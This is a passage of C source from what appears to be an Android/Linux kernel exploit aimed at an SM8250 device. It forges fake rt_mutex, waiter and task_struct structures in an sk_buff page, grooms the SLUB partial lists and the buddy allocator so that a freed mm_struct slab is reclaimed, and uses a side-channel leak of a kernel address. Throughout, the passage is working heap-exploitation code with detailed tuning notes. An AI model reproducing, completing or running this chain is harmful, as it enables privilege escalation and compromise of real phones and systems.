    put64(p, W0_OFF + 0x38, fake_lock);

    /* Offset-tolerant safety fill: every qword in the fake task's PI region
     * is a self-referencing empty plist head, so kernel reads at a wrong
     * task_struct offset still yield a valid empty list and all kernel-side
     * writes stay inside this page instead of panicking. Explicit fields
     * below still land at the intended offsets. */
    for (size_t off = FAKE_TASK_OFF + 0x600; off < FAKE_TASK_OFF + 0xb00;
         off += 8) {
      put64(p, off, payload_base + off);
    }
    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    /* KS_W1_ONLY_FIRST: stop the walk after the first lock.  With
     * fake_task->pi_blocked_on == NULL the chain takes
     * task_blocked_on_lock(fake_task) == NULL and exits at out_put_task
     * before it ever follows fake_w0.  A survival with this switch
     * localises a fault to the fake-waiter half of the walk; a reboot
     * localises it to fake_lock/fake_task. */
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
          getenv("KS_W1_ONLY_FIRST") ? 0 : fake_w0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }

  if (!filled_chunks) {
    /* Fail closed: an uninitialised page is 0x41 poison, and
     * fake_lock->wait_lock would make the PI walk spin forever. */
    pr_error("payload wrote no chunk end=%zu size=%d\n", payload_end,
             SKB_SEND_SIZE);
    return 0;
  }
  if (payload_mode == PAGE_PAYLOAD_S2) {
    /* The sendmsg data is the controlled SKB prefix below shared_info. */
    unsigned char *p = page_image.buf + SKB_FRAG_BIAS;

    put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
    put64(p, LOCK_OFF + RT_MUTEX_LEFTMOST_OFF, fake_w0);
    put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, fake_task | 1);

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + 0x18, 1);
    put64(p, W0_OFF + 0x20, 0);
    put64(p, W0_OFF + 0x28, 0);
    put64(p, W0_OFF + 0x30, fake_task);
    put64(p, W0_OFF + 0x38, fake_lock);
    put32(p, W0_OFF + 0x40, 140);
    put32(p, W0_OFF + 0x44, 0);
    put64(p, W0_OFF + 0x48, 0);
    put64(p, W0_OFF + 0x50, 0);
    put64(p, W0_OFF + 0x58, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put64(p, FAKE_TASK_OFF + 0x420, 0);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
          fake_w0 + 0x18);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
          fake_w0 + 0x18);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, fake_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
  }

  if (getenv("KS_IMAGE_ZERO")) {
    /* False-able identity test: with every byte of the presumed page zeroed,
     * the walk's first dereference of lock->waiters.rb_leftmost (+0x18) reads
     * zero, so rt_mutex_adjust_prio_chain takes the empty-waiters branch at
     * +0x2fc and the panic PC must move off +0x304 if and only if base holds
     * this image. */
    memset(page_image.buf, 0, SKB_SEND_SIZE);
    pr_info("KS_PUNCH_IMAGE fill=zero bytes=%d base=%016zx\n", SKB_SEND_SIZE,
            (size_t)base);
  }
  page_image.want_rb = image_q64(LOCK_OFF + RT_MUTEX_WAITERS_OFF);
  page_image.want_leftmost = image_q64(LOCK_OFF + RT_MUTEX_LEFTMOST_OFF);
  page_image.want_owner = image_q64(LOCK_OFF + RT_MUTEX_OWNER_OFF);
  page_image.want_w0_lock = image_q64(W0_OFF + 0x38);
  page_image.want_blocked =
      image_q64(FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF);
  page_image.built = 1;
  return 1;
}

/* Upstream's trigger-slab drain (APP_CONTROLLED_MM_GROUP_RECLAIM).
 *
 * A slab that is merely emptied stays frozen on the per-CPU partial list and
 * is never handed back to the buddy allocator, so the order-3 skb spray can
 * never receive it.  Only the FIRST free of a *full* slab calls
 * put_cpu_partial(s, page, drain=1), and only once pobjects passes
 * s->cpu_partial (6 for a 1 KiB object) does unfreeze_partials() run - the
 * sole path that discards an emptied slab.
 *
 * So: keep the target slab full until the pre-fire has saturated the node
 * partial list, then drop the target survivor, flush the CPU partial with
 * two full trigger slabs held back for that purpose, and spray at once.
 */
/* Drain the buddy allocator's order-3 free list.  Each held AF_UNIX skb pins
 * one order-3 frag page, so after this the only order-3 block a later request
 * can receive is the slab this run discards.  Held until after the spray. */

/* Take base's order-3 buddy and hold it.
 *
 * The slab page behind base came from alloc_pages(order 3).  When that
 * split a larger block, expand() (mm/page_alloc.c:1984) published the upper
 * half at the head of free_area[3], and that half is base ^ 0x8000 -- the
 * buddy __free_one_page() merges base's page with on discard.  A merge takes
 * the block out of order 3 entirely, so the image send's alloc_pages(order 3)
 * never reaches it.  One order-3 allocation of our own, issued as the next
 * order-3 allocation after the burst, takes that head and holds it (the skb
 * stays queued) through the discard.  Counted and reported, so a failed
 * capture shows as 0 instead of being assumed. */
static unsigned ks_cap_tries;
static unsigned ks_cap_sent;
static int ks_cap_err;
static int ks_cap_sndbuf;

static void ks_cap_report(void) {
  pr_info("KS_BUDDY_CAPTURE tries=%u sends=%u errno=%d sndbuf=%d cpu=%d\n",
          ks_cap_tries, ks_cap_sent, ks_cap_err, ks_cap_sndbuf,
          sched_getcpu());
}

static int ks_buddy_capture(void) {
  static int sv[2] = {-1, -1};
  if (sv[0] < 0 && socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) != 0) {
    return 0;
  }
  {
    int want = SKB_RECLAIM_SNDBUF;
    if (setsockopt(sv[0], SOL_SOCKET, SO_SNDBUFFORCE, &want, sizeof(want)) !=
        0) {
      (void)setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &want, sizeof(want));
    }
    if (setsockopt(sv[1], SOL_SOCKET, SO_RCVBUFFORCE, &want, sizeof(want)) !=
        0) {
      (void)setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &want, sizeof(want));
    }
    {
      int got = 0;
      socklen_t gl = sizeof(got);
      getsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &got, &gl);
      ks_cap_sndbuf = got;
    }
  }
  {
    struct iovec iov;
    struct msghdr m;
    ssize_t n;
    static unsigned char capbuf[SKB_SEND_SIZE];
    memset(capbuf, 0x43, sizeof(capbuf));
    iov.iov_base = capbuf;
    iov.iov_len = (size_t)SKB_SEND_SIZE;
    memset(&m, 0, sizeof(m));
    m.msg_iov = &iov;
    m.msg_iovlen = 1;
    errno = 0;
    n = sendmsg(sv[0], &m, MSG_DONTWAIT);
    ks_cap_tries++;
    if (n == (ssize_t)SKB_SEND_SIZE) {
      ks_cap_sent++;
      return 1;
    }
    ks_cap_err = errno;
    return 0;
  }
}

static int ks_buddy_hold(size_t blocks, const void *data, int **out_fds,
                         size_t *out_n) {
  unsigned char *buf;
  int *fds;
  size_t made = 0;

  if (out_fds == NULL || out_n == NULL) {
    return 0;
  }
  *out_fds = NULL;
  *out_n = 0;
  if (blocks == 0) {
    return 0;
  }
  fds = malloc(blocks * 2 * sizeof(*fds));
  buf = malloc(SKB_SEND_SIZE);
  if (fds == NULL || buf == NULL) {
    free(fds);
    free(buf);
    return 0;
  }
  for (size_t i = 0; i < blocks * 2; ++i) {
    fds[i] = -1;
  }
  if (data != NULL) {
    memcpy(buf, data, SKB_SEND_SIZE);
  } else {
    memset(buf, 0x42, SKB_SEND_SIZE);
  }
  pin_to_core(CORE);
  for (size_t i = 0; i < blocks; ++i) {
    struct iovec iov;
    struct msghdr msg;
    ssize_t sent;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, &fds[i * 2]) != 0) {
      break;
    }
    memset(&iov, 0, sizeof(iov));
    iov.iov_base = buf;
    iov.iov_len = SKB_SEND_SIZE;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    sent = sendmsg(fds[i * 2], &msg, 0);
    if (sent != (ssize_t)SKB_SEND_SIZE) {
      close(fds[i * 2]);
      close(fds[i * 2 + 1]);
      fds[i * 2] = fds[i * 2 + 1] = -1;
      break;
    }
    made++;
  }
  free(buf);
  if (made == 0) {
    free(fds);
    return 0;
  }
  *out_fds = fds;
  *out_n = made;
  pr_info("KS_BUDDY_HOLD blocks=%zu cpu=%d\n", made, sched_getcpu());
  return 1;
}

static void ks_buddy_release(int *fds, size_t n) {
  if (fds == NULL) {
    return;
  }
  for (size_t i = 0; i < n * 2; ++i) {
    if (fds[i] >= 0) {
      close(fds[i]);
    }
  }
  free(fds);
}

/* Vendor set_cpu_partial() (mm/slub.c:3745): the per-CPU partial limit is a
 * function of the cache's object size.  slabinfo reports mm_struct as
 * 1024-byte objects, so this cache's limit is 6 - derive it the same way the
 * vendor does instead of hardcoding the number at the call site. */
static size_t mm_cpu_partial_limit(void) {
  if (MM_STRUCT_SZ >= PAGE_SIZE) {
    return 2;
  }
  if (MM_STRUCT_SZ >= 1024) {
    return 6;
  }
  if (MM_STRUCT_SZ >= 256) {
    return 13;
  }
  return 30;
}

/* Vendor set_min_partial() / mm/slub.c MIN_PARTIAL: __slab_free() discards an
 * emptied, non-frozen partial slab only when the node partial list already
 * holds at least this many slabs.  The vendor default is 5; this is the gate
 * the crossing free has to satisfy, not a tunable. */
static int mm_min_partial_limit(void) { return 5; }


/* Upstream's controlled drain, split into the two halves the allocator
 * actually distinguishes.  SLUB only returns an emptied slab to buddy from one
 * of two places:
 *
 *   __slab_free()         -> !new.inuse && n->nr_partial >= s->min_partial
 *   __unfreeze_partials() -> discards every empty slab on the CPU partial list
 *
 * An emptied slab whose node partial list is still short of min_partial takes
 * neither path.  The first free after the slab went full sets new.frozen=1 and
 * parks it on this CPU's partial list; every later free of it reports
 * FREE_FROZEN and returns.  Only an unfreeze_partials() run can release it,
 * and that is reached exclusively through put_cpu_partial(s, page, drain=1),
 * i.e. from the first free of a *full* slab once pobjects passes cpu_partial
 * (6 at a 1 KiB object size).
 *
 * The pre-fire runs while the target slab is still full and frees one object
 * from each of trigger_pre_slabs full slabs; cpu_partial + 1 full slabs are
 * kept unfired until after the target dies, when their first frees push
 * pobjects past the limit and flush the CPU partial, discarding the target's
 * emptied slab. */
static int ks_trigger_prepare(size_t trigger_slabs, int **out_fds,
                              size_t *out_count) {
  size_t refs = trigger_slabs * mm_objs_per_slab;
  int *fds;

  if (out_fds == NULL || out_count == NULL || refs == 0) {
    return 0;
  }
  fds = malloc(refs * sizeof(*fds));
  if (fds == NULL) {
    return 0;
  }
  for (size_t i = 0; i < refs; ++i) {
    fds[i] = -1;
  }
  pin_to_core(CORE);
  for (size_t i = 0; i < refs; ++i) {
    /* child processes, not /proc/<pid>/mem fds: mm_access() takes an
     * mm_users reference and mem_release() only mmdrop()s, so a memfd
     * pinned every trigger mm forever and the "trigger" never freed an
     * object at all.  A killed child runs mmput() -> free_mm(). */
    fds[i] = clone_child();
    if (fds[i] <= 0) {
      for (size_t j = 0; j < i; ++j) {
        if (fds[j] > 0) {
          kill_child(fds[j]);
        }
      }
      free(fds);
      return 0;
    }
  }
  *out_fds = fds;
  *out_count = refs;
  pr_info("KS_TRIGGER prepared slabs=%zu refs=%zu cpu=%d\n", trigger_slabs,
          refs, sched_getcpu());
  return 1;
}

/* One free per full slab: each is that slab's first free, the only event that
 * feeds pobjects and can reach unfreeze_partials(). */
static void ks_trigger_fire(int *fds, size_t count, size_t pass) {
  size_t slabs;

  if (fds == NULL || count == 0 || mm_objs_per_slab == 0) {
    return;
  }
  slabs = count / mm_objs_per_slab;
  for (size_t page = 0; page < slabs; ++page) {
    size_t idx = page * mm_objs_per_slab + pass;
    if (idx >= (page + 1) * mm_objs_per_slab) continue;
    if (fds[idx] > 0) {
      kill_child(fds[idx]);
      fds[idx] = -1;
    }
  }
  pr_info("KS_TRIGGER fired slabs=%zu cpu=%d\n", slabs, sched_getcpu());
}

static void ks_trigger_release(int *fds, size_t count) {
  if (fds == NULL) {
    return;
  }
  for (size_t i = 0; i < count; ++i) {
    if (fds[i] > 0) {
      kill_child(fds[i]);
      fds[i] = -1;
    }
  }
  free(fds);
}

/* A CLONE_VM thread is an mm_users reference (copy_mm -> mmget).  The
 * KernelSnitch scan leaves __do_increase() threads parked in FUTEX_WAIT; a
 * thread that missed the scan's wake is still in the target's tgid when the
 * group leader is killed, so the target's mm_struct can outlive kill_child().
 * Scan the process's own task list, not an inference from the cache. */
static int count_tgid_tasks(pid_t tgid) {
  DIR *d = opendir("/proc");
  struct dirent *de;
  int n = 0;
  if (d == NULL || tgid <= 0) {
    return 0;
  }
  while ((de = readdir(d)) != NULL) {
    char path[64];
    char line[256];
    FILE *f;
    if (de->d_name[0] < '0' || de->d_name[0] > '9') {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/%s/status", de->d_name);
    f = fopen(path, "r");
    if (f == NULL) {
      continue;
    }
    while (fgets(line, sizeof(line), f) != NULL) {
      int t = 0;
      if (sscanf(line, "Tgid: %d", &t) == 1) {
        if (t == (int)tgid) {
          n++;
        }
        break;
      }
    }
    fclose(f);
  }
  closedir(d);
  return n;
}

/* Kill the sibling tasks of a tgid but leave the thread-group leader alive:
 * the leader's exit must be the one that drops the last mm_users reference and
 * frees the mm_struct, so it has to run on the emptying CPU and nowhere else. */
static int kill_tgid_extras(pid_t tgid) {
  DIR *d = opendir("/proc");
  struct dirent *de;
  int n = 0;
  if (d == NULL || tgid <= 0) {
    return 0;
  }
  while ((de = readdir(d)) != NULL) {
    char path[64];
    char line[256];
    FILE *f;
    int tid;
    if (de->d_name[0] < '0' || de->d_name[0] > '9') {
      continue;
    }
    tid = atoi(de->d_name);
    if (tid == (int)tgid) {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/%s/status", de->d_name);
    f = fopen(path, "r");
    if (f == NULL) {
      continue;
    }
    while (fgets(line, sizeof(line), f) != NULL) {
      int t = 0;
      if (sscanf(line, "Tgid: %d", &t) == 1) {
        if (t == (int)tgid) {
          if (kill(tid, SIGKILL) == 0) {
            n++;
          }
        }
        break;
      }
    }
    fclose(f);
  }
  closedir(d);
  return n;
}

static int kill_tgid_tasks(pid_t tgid) {
  DIR *d = opendir("/proc");
  struct dirent *de;
  int n = 0;
  if (d == NULL || tgid <= 0) {
    return 0;
  }
  while ((de = readdir(d)) != NULL) {
    char path[64];
    char line[256];
    FILE *f;
    if (de->d_name[0] < '0' || de->d_name[0] > '9') {
      continue;
    }
    snprintf(path, sizeof(path), "/proc/%s/status", de->d_name);
    f = fopen(path, "r");
    if (f == NULL) {
      continue;
    }
    while (fgets(line, sizeof(line), f) != NULL) {
      int t = 0;
      if (sscanf(line, "Tgid: %d", &t) == 1) {
        if (t == (int)tgid) {
          kill((pid_t)atoi(de->d_name), SIGKILL);
          n++;
        }
        break;
      }
    }
    fclose(f);
  }
  closedir(d);
  return n;
}

static int close_target_memfds(pid_t tgid) {
  DIR *d = opendir("/proc/self/fd");
  struct dirent *de;
  int n = 0;
  if (d == NULL || tgid <= 0) {
    return 0;
  }
  while ((de = readdir(d)) != NULL) {
    char path[64];
    char link[256];
    ssize_t len;
    int fd;
    if (de->d_name[0] < '0' || de->d_name[0] > '9') {
      continue;
    }
    fd = atoi(de->d_name);
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    len = readlink(path, link, sizeof(link) - 1);
    if (len <= 0) {
      continue;
    }
    link[len] = '\0';
    {
      char needle[32];
      snprintf(needle, sizeof(needle), "/proc/%d/", (int)tgid);
      if (strstr(link, needle) != NULL && strstr(link, "/mem") != NULL) {
        close(fd);
        n++;
      }
    }
  }
  closedir(d);
  return n;
}

static void release_ctx_children(struct mm_ctx *ctx) {
  if (ctx == NULL || ctx->childs == NULL) {
    return;
  }
  for (size_t i = 0; i < ctx->mm_cnt; ++i) {
    if (ctx->memfds != NULL && ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
    if (ctx->childs[i] > 0) {
      if (kill(ctx->childs[i], SIGKILL) == 0) {
        while (waitpid(ctx->childs[i], NULL, 0) < 0 && errno == EINTR) {
        }
      }
      ctx->childs[i] = -1;
    }
  }
}

/* One line per preparation: the lifecycle the run actually recorded, and
 * whether the reported outcome is supported by it.  Printing only; no branch
 * above depends on the state machine. */
static void ks_state_log(const kp_run *run, const char *cleanup,
                         unsigned long long base) {
  pr_info("KS_STATE stage=%s outcome=%s samples=%u missing=%u report=%d "
          "cleanup=%s refusal=%s base=%016llx\n",
          kp_stage_name(run->stage), kp_outcome_name(run->outcome),
          run->samples, run->missing, kp_run_report_ok(run), cleanup,
          run->refusal != NULL ? run->refusal : "none", base);
}

uintptr_t prepare_kernel_page(int payload_mode) {
  kp_result_reset();
  close_reclaim_sockets();
  leak_stage_failed = 0;
  ks_discard_failed = 0;
  long baseline_slabs = -1;
  /* Per-object slab-page identity: measured geometry, the one address the
   * leak recovers, and one table row per burst slot. */
  struct kp_geometry kp_geo;
  struct kp_identity kp_anchor;
  /* SLUB object stride, not logical mm_struct size: 0x388 + 8-byte
   * cpumask (CONFIG_NR_CPUS=8) = 0x390 request, HWCACHE_ALIGN to the
   * SM8250 64-byte cache line -> 0x3c0 (see rt-waiter-placement-audit.md). */
  /* SLUB object stride (ALIGN(sizeof, cache line)), not the logical size. */
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  /* Slabinfo reports objsize/objperslab/pagesperslab, so the slab span
   * does not have to be assumed from ORDER3_SIZE.  The line also prints
   * whether those constants agree with the kernel's own numbers. */
  kp_identity_read(&kp_geo);
  kp_identity_surface(&kp_geo, (long)mm_objs_per_slab, (long)ORDER3_SIZE);
  mm_slab_counts(NULL, &baseline_slabs);
  mm_slab_log("baseline");
  prepare_ctxs();

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int *trigger_fds = NULL;
  size_t trigger_count = 0;
  size_t trigger_slabs = 0;
  size_t trigger_pre_slabs = 0;
  size_t trigger_drain_slabs = 0;
  int *buddy_fds = NULL;
  size_t buddy_n = 0;

  double ks_t0 = ks_now_ms();
  /* Both order-3 buddies of the target stay allocated until the first
   * reclaim send: a free buddy lets the emptied block merge upward and
   * expand() then hands out the lower half, which may not be the target. */
  int hold_neighbours = 1;
  long slab_before = -1;
  long active_before = -1;
  long post_isolate_slabs = -1;
  long post_isolate_active = -1;
  long post_isolate_num = -1;
  uintptr_t leaked = cached_leaked_mm;
  /* No preload from /data/local/tmp here.  A file left by an earlier run
   * describes a different mm (the address dies with its process), and using
   * it would aim the fake page at an unrelated object.  The only accepted PC
   * answer is the one verified against this run's exported collisions inside
   * run_kernelsnitch_bruteforce(). */
  if (!leaked) {
    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
    detect_memory();
    ks = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
    ks->identity_end = (size_t)g_direct_map_end;
    {
      const char *scan_start = getenv("KS_MM_START");
      const char *scan_end = getenv("KS_MM_END");
      if (scan_start && *scan_start && scan_end && *scan_end) {
        uintptr_t start = (uintptr_t)strtoull(scan_start, NULL, 0);
        uintptr_t end = (uintptr_t)strtoull(scan_end, NULL, 0);
        if (start < end && start >= g_direct_map_base && end <= g_direct_map_end) {
          ks->identity_start = start;
          ks->identity_end = end;
          pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", start, end);
        }
      }
    }
    ks->ram_bytes = g_ram_bytes;

    /* Align the target slab to a fresh allocation.  slabdata increments on
     * the allocation that takes the first object of a new slab, so that
     * child is target filler #0; the next 30 fillers and the leak child
     * complete the same 32-object slab.  All 32 are ours, so freeing them
     * empties the slab; the lead children before the boundary fill the
     * previous slab and are held as its below-neighbour. */
    {
      long slabs_prev = -1;
      long slabs_now = -1;
      size_t lead_n = 0;
      size_t pre_n = 0;
      size_t cap = lead_ctx.mm_cnt;
      pin_to_core(CORE);
      mm_slab_counts_full(&slot_a0, NULL, &slabs_prev);
      long burst_num_prev = -1;
      long burst_num_now = -1;
      mm_slab_counts_full(NULL, &burst_num_prev, &slabs_prev);
      while (lead_n < cap && pre_n == 0) {
        pid_t c = clone_child();
        if (c <= 0) break;
        /* This fork is the allocation that may have split the block and
         * published base's buddy at the head of free_area[3]; take it before
         * the slabinfo read allocates anything. */
        (void)ks_buddy_capture();
        mm_slab_counts_full(&slot_a1, &burst_num_now, &slabs_now);
        mm_slot_probe("burst", pre_n, slot_a0, slabs_prev, slot_a1, slabs_now,
                      &slot_partial);
        /* Fresh slab: object count rises by one slab *and* slab count rises
         * by one at this allocation.  slabdata alone also counts pages that
         * other CPUs add to the node list, which put the burst on a cached
         * partial page whose foreign free object stopped it ever freezing. */
        if (slabs_now == slabs_prev + 1 &&
            burst_num_now == burst_num_prev + (long)mm_objs_per_slab) {
          pre_ctx.childs[pre_n] = c;
          pre_slots[pre_n] = pin_slot_of_last;
          pre_n++;
          break;
        }
        lead_ctx.childs[lead_n++] = c;
        slabs_prev = slabs_now;
        burst_num_prev = burst_num_now;
        slot_a0 = slot_a1;
      }
      /* Fill the rest of that slab in one uninterrupted run.  Two slabinfo
       * reads between forks (the old per-slot probe) left a multi-millisecond
       * window per slot in which any other process on this CPU could take one
       * of the page's 32 slots: the unfreeze then revealed exactly 31 free
       * objects for the 31 freed fillers, i.e. the page still held one live
       * object that was never ours and could never empty. */
      /* The leak child takes the NEXT slot of the fresh page, not the last.
       * It is the second allocation from a page that still has 31 free
       * objects, so its mm_struct is in this slab by construction.  Forked
       * last instead, its slot was whatever the CPU's freelist still held
       * after 31 other forks, and the cycle where that slot was gone reported
       * the page as never emptying (KS_GATE d_empty=0 d_num=0 d_slabs=0 while
       * the control page discarded on the same strobe).
       *
       * It is a filler here: it dies in the freeze, on CORE, so its free lands
       * on the CPU the crossing drains.  The slab's last live object is then a
       * plain child whose exit is the emptying free the control page has
       * already proven, instead of the scan child. */
      child_leak = clone_leak_child();
      if (child_leak > 0) {
        pre_ctx.childs[pre_n] = child_leak;
        pre_slots[pre_n] = -1; /* pins itself; the loop still checks its CPU */
        pre_n++;
      }
      while (pre_n < pre_ctx.mm_cnt) {
        /* Every filler must free on the CPU whose partial list the crossing
         * drains; the slab's last live object is the exception - its exit is
         * the emptying free, so it waits on the escaped CPU. */
        pid_t c = clone_child_cpu(pre_n + 1 == pre_ctx.mm_cnt ? EMPTYING_CPU
                                                              : CORE);
        if (c <= 0) break;
        (void)ks_buddy_capture();
        pre_ctx.childs[pre_n] = c;
        pre_slots[pre_n] = pin_slot_of_last;
        pre_n++;
      }
      lead_ctx.mm_cnt = lead_n;
      /* The slab that appeared at the boundary must hold all 31 fillers
       * and the leak child as its last slot.  The fork must follow the last
       * filler with no syscall in between: pr_info() is write()+fsync(), and
       * that window is long enough for another process on this CPU to take
       * the page's last free object, after which the leak child's mm comes
       * from a different slab and base is a page the payload only partly
       * owns (measured: the unfreeze revealed exactly 31 free objects, i.e.
       * one live object that was never ours). */
      burst_boundary_slabs = slabs_now;
      burst_boundary_num = burst_num_now;
      pr_info("KS_PRE lead=%zu fillers=%zu leak_slot=1 slabs=%ld->%ld\n",
              lead_n, pre_n, slabs_prev, slabs_now);
      mm_slab_counts_full(NULL, &burst_after_num, &burst_after_slabs);
      burst_slots = pre_n;
      burst_span_ok = (burst_after_slabs == burst_boundary_slabs &&
                       burst_after_num == burst_boundary_num &&
                       burst_slots == mm_objs_per_slab);
      pr_info("KS_BURST slots=%zu boundary_slabs=%ld after_slabs=%ld "
              "span_ok=%d expect=%d plan_cpu=%d\n", burst_slots,
              burst_boundary_slabs, burst_after_slabs, burst_span_ok,
              (int)mm_objs_per_slab, (int)EMPTYING_CPU);
      if (burst_span_ok == 1) {
        kp_result_mark(KP_ANCHOR_VERIFIED);
      }
      /* The burst's slab split an order-3 block, so its buddy is at the head
       * of free_area[3] right now.  Take it before the control burst or any
       * other order-3 allocation can, and keep it held. */
      if (burst_span_ok) {
        ks_cap_report();
      }
      /* Control burst: same method, same cache, its own boundary.  One lead
       * loop finds the slab that grew at a known allocation; the next 32
       * children fill it, the last pinned to the escaped emptying CPU. */
      {
        long ctl_prev = -1;
        long ctl_now = -1;
        int found = 0;
        size_t cn = 0;
        mm_slab_counts(NULL, &ctl_prev);
        for (size_t lead = 0; lead < 64; lead++) {
          pid_t c = clone_child();
          if (c <= 0) {
            break;
          }
          mm_slab_counts_full(&slot_a0, NULL, &ctl_now);
          mm_slot_probe("control", cn, slot_a1, ctl_prev, slot_a0, ctl_now,
                        &slot_partial);
          slot_a1 = slot_a0;
          if (ctl_now > ctl_prev) {
            found = 1;
            control_childs[cn] = c;
            ctl_slots[cn] = pin_slot_of_last;
            cn++;
            break;
          }
          ctl_prev = ctl_now;
        }
        while (cn < (size_t)mm_objs_per_slab) {
          mm_slab_counts_full(&slot_a0, NULL, &slot_s0);
          pid_t c = clone_child_cpu(cn + 1 == (size_t)mm_objs_per_slab
                                        ? EMPTYING_CPU
                                        : CORE);
          if (c <= 0) {
            break;
          }
          mm_slab_counts_full(&slot_a1, NULL, &slot_s1);
          mm_slot_probe("control", cn, slot_a0, slot_s0, slot_a1, slot_s1,
                        &slot_partial);
          control_childs[cn] = c;
          ctl_slots[cn] = pin_slot_of_last;
          cn++;
        }
        {
          long ctl_after = -1;
          mm_slab_counts(NULL, &ctl_after);
          control_cnt = cn;
          control_last = (cn == (size_t)mm_objs_per_slab)
                             ? control_childs[cn - 1]
                             : -1;
          pr_info("KS_CONTROL slots=%zu boundary_slabs=%ld after_slabs=%ld "
                  "span_ok=%d expect=%d last_pid=%d\n", cn, ctl_now, ctl_after,
                  (found && ctl_after == ctl_now) ? 1 : 0,
                  (int)mm_objs_per_slab, (int)control_last);
        }
      }
    }
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      post_ctx.childs[i] = clone_child();
    }

    /* No /proc/<pid>/mem pins.  Vendor mem_release() calls mmdrop()
     * although mm_access() took an mm_users reference, so every such fd
     * pins its mm forever: the target slab could never empty and no
     * spray page could ever land on base.  The children's own lifetimes
     * are the pins now; kill_child() releases them. */
    for (size_t i = 0; i < lead_ctx.mm_cnt; i++) {
      lead_ctx.memfds[i] = -1;
    }
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      pre_ctx.memfds[i] = -1;
    }
    memfd_leak = -1;
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      post_ctx.memfds[i] = -1;
    }

    /* Wait for the in-child scan before releasing anything: a partially
     * free slab on the SLUB partial list could be handed to any system
     * fork during the ~10 minute scan, and the leaked slot would be gone. */
    wait_leak_child(child_leak);
    leaked = ks->mm_struct;
    pr_info("KS_TIME leak_ms=%.0f\n", ks_now_ms() - ks_t0);

    /* /proc/<pid>/mem holds an mm reference: if it outlives the task the
     * slab object survives too and the SKB page can never replace it. */
    /* Closing /proc/<pid>/mem only drops the fd reference; the child still
     * owns its mm_struct, so the slab object stays live and the target slab
     * can never empty.  The child has to actually die. */
    /* The 31 target fillers stay alive until the pre-fire sweep.  The
     * trigger's 768 clones allocate after this point; a one-live target
     * slab would be handed to them, and their frees would move it between
     * the CPU partial and node partial lists before the final free. */
    /* The emptying free is the target's own exit.  A /proc/<pid>/mem fd
     * would hold mm_count via proc_mem_open(), but closing it was measured
     * not to reach the last reference on this tree (KS_ARITH d_empty=0 even
     * after the close), so this chain takes no fd on the target. */
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      if (post_ctx.memfds[i] >= 0) {
        SYSCHK(close(post_ctx.memfds[i]));
      }
      post_ctx.memfds[i] = -1;
    }
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
      if (spray_ctx.memfds[i] >= 0) {
        SYSCHK(close(spray_ctx.memfds[i]));
      }
